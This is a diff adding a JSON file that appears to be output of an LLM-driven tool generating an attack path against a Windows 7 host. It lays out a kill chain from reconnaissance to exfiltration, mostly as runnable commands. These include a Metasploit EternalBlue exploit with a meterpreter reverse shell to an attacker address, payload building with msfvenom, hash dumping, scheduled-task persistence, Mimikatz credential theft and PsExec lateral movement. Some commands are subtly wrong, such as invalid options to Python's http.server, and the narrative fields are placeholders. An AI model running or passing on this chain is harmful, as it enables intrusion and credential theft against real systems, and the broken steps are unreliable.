@@ -1,0 +1,170 @@
+{
+  "request_id": "3e05258b-1cf4-4e3f-8625-c3f2ea949c39",
+  "primary_path": [
+    {
+      "stage_index": 1,
+      "stage_name": "Reconnaissance",
+      "phase": "Information Gathering",
+      "mitre_techniques": ["T1595", "T1592", "T1598"],
+      "summary": "Passive reconnaissance revealed open ports 139 and 445 exposing SMB service",
+      "key_findings": [
+        "Port 139 (NetBIOS) exposed",
+        "Port 445 (SMB) exposed",
+        "MS17-010 vulnerability identified",
+        "Windows 7 OS detected"
+      ],
+      "tools_used": ["nmap", "shodan"],
+      "artifact_name": "",
+      "artifact_type": null,
+      "commands": [],
+      "content": "Full detailed narrative content here..."
+    },
+    {
+      "stage_index": 2,
+      "stage_name": "Weaponization",
+      "phase": "Payload Creation",
+      "mitre_techniques": ["T1203", "T1587.001", "T1588.001"],
+      "summary": "Created malicious payload targeting MS17-010 vulnerability",
+      "artifact_name": "eternalblue_payload.exe",
+      "artifact_type": "Windows PE Executable",
+      "key_findings": [
+        "Exploit target: CVE-2017-0144 (EternalBlue)",
+        "Encoding: x86/shikata_ga_nai",
+        "Obfuscation: enabled"
+      ],
+      "tools_used": ["msfconsole", "msfvenom"],
+      "commands": [
+        "msfconsole",
+        "use exploit/windows/smb/ms17_010_eternalblue",
+        "set RHOSTS <TARGET_IP>",
+        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        "set LHOST <YOUR_IP>",
+        "set LPORT 4444",
+        "set ENCODING x86/shikata_ga_nai",
+        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -e x86/shikata_ga_nai -o eternalblue_payload.exe"
+      ],
+      "content": "Full detailed narrative content here..."
+    },
+    {
+      "stage_index": 3,
+      "stage_name": "Delivery",
+      "phase": "Payload Transmission",
+      "mitre_techniques": ["T1190", "T1203", "T1566"],
+      "summary": "Delivered payload using Metasploit EternalBlue exploit",
+      "artifact_name": "eternalblue_payload.exe",
+      "artifact_type": "Malware/Payload",
+      "key_findings": [
+        "Delivery method: SMB Exploit",
+        "Target port: 445",
+        "Target service: Microsoft-DS (SMB)"
+      ],
+      "tools_used": ["msfconsole"],
+      "commands": [
+        "msfconsole",
+        "use exploit/windows/smb/ms17_010_eternalblue",
+        "set RHOST 192.168.1.10",
+        "set LHOST 192.168.1.5",
+        "set LPORT 4444",
+        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        "set ENCODER x86/shikata_ga_nai",
+        "exploit"
+      ],
+      "content": "Full detailed narrative content here..."
+    },
+    {
+      "stage_index": 4,
+      "stage_name": "Exploitation",
+      "phase": "Initial Access",
+      "mitre_techniques": ["T1190", "T1203", "T1046", "T1071"],
+      "summary": "Successfully exploited MS17-010 gaining SYSTEM-level access",
+      "artifact_name": "",
+      "artifact_type": null,
+      "key_findings": [
+        "Vulnerability: CVE-2017-0144 (EternalBlue)",
+        "Severity: Critical (CVSS 9.8)",
+        "Privilege level: SYSTEM",
+        "User context: NT AUTHORITY\\SYSTEM"
+      ],
+      "tools_used": ["msfconsole"],
+      "commands": [
+        "sysinfo",
+        "getuid",
+        "hashdump"
+      ],
+      "content": "Full detailed narrative content here..."
+    },
+    {
+      "stage_index": 5,
+      "stage_name": "Installation",
+      "phase": "Persistence",
+      "mitre_techniques": ["T1105", "T1053.005", "T1543.003", "T1547.001"],
+      "summary": "Established persistence using scheduled task mechanism",
+      "artifact_name": "eternalblue_payload.exe",
+      "artifact_type": "Windows PE Executable",
+      "key_findings": [
+        "Persistence mechanism: Windows Scheduled Task",
+        "Deployment location: C:\\Temp\\eternalblue_payload.exe",
+        "Task name: EternalBluePersistence",
+        "Trigger: onlogon"
+      ],
+      "tools_used": ["cmd.exe", "schtasks.exe"],
+      "commands": [
+        "upload eternalblue_payload.exe C:\\Temp\\eternalblue_payload.exe",
+        "cmd.exe /c schtasks /create /tn \"EternalBluePersistence\" /tr \"C:\\Temp\\eternalblue_payload.exe\" /sc onlogon /rl highest",
+        "cmd.exe /c schtasks /query /fo LIST"
+      ],
+      "content": "Full detailed narrative content here..."
+    },
+    {
+      "stage_index": 6,
+      "stage_name": "Command & Control",
+      "phase": "Communication Channel",
+      "mitre_techniques": ["T1071.001", "T1573.001", "T1008", "T1043"],
+      "summary": "Established C2 channel using HTTPS with encryption",
+      "artifact_name": "",
+      "artifact_type": null,
+      "key_findings": [
+        "C2 Protocol: HTTPS",
+        "C2 Port: 443",
+        "Encryption: SSL/TLS",
+        "Beacon frequency: Every 5 minutes",
+        "Communication obfuscation: enabled"
+      ],
+      "tools_used": ["Python", "SSL/TLS"],
+      "commands": [
+        "python3 -m http.server 443 --crt server.crt --key server.key"
+      ],
+      "content": "Full detailed narrative content here..."
+    },
+    {
+      "stage_index": 7,
+      "stage_name": "Actions on Objectives",
+      "phase": "Post-Exploitation",
+      "mitre_techniques": ["T1003", "T1021", "T1041", "T1567", "T1068"],
+      "summary": "Executed post-exploitation objectives for data exfiltration and lateral movement",
+      "artifact_name": "",
+      "artifact_type": null,
+      "key_findings": [
+        "Credential Dumping: Mimikatz extraction from memory",
+        "Lateral Movement: PsExec to adjacent systems",
+        "Data Exfiltration: tar compression and C2 upload",
+        "Privilege Escalation: DLL hijacking exploitation"
+      ],
+      "tools_used": ["Mimikatz", "PsExec", "tar"],
+      "commands": [
+        "sekurlsa::minidump <path_to_memory_dump>",
+        "sekurlsa::process",
+        "sekurlsa::logonpasswords",
+        "psexec \\\\target-system -u domain\\admin -p password cmd.exe",
+        "tar -cvzf sensitive_data_backup.tar.gz /path/to/sensitive/data"
+      ],
+      "content": "Full detailed narrative content here..."
+    }
+  ],
+  "total_paths": 1,
+  "execution_time_seconds": 111.07,
+  "llm_calls": {
+    "total": 7
+  },
+  "estimated_cost": 0.015
+}
